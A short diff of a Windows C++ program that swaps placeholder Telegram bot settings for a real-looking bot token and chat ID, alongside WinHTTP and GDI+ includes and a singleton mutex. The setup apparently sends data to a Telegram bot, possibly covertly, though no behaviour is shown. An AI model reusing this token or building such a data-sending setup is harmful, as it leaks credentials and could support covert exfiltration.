@@ -1,7 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winhttp.h>
-#include <gdiplus.h>
+#include <gdiplus.h>              // ← FIXED ORDER!
 #include <commctrl.h>
 #include <shellapi.h>
 #include <string>
@@ -20,11 +20,13 @@
 #pragma comment(lib, "comctl32.lib")
 
 using namespace Gdiplus;
+
+using namespace Gdiplus;
 #pragma comment(lib, "gdiplus.lib")
 
 // Config
-const wchar_t* TELEGRAM_BOT_TOKEN = L"YOUR_BOT_TOKEN_HERE";
-const wchar_t* TELEGRAM_CHAT_ID = L"YOUR_CHAT_ID_HERE";
+const wchar_t* TELEGRAM_BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
+const wchar_t* TELEGRAM_CHAT_ID = L"7845441585";
 const wchar_t* MUTEX_NAME = L"AngelSmartMichael_v5.0_Singleton";
 
 // Global state
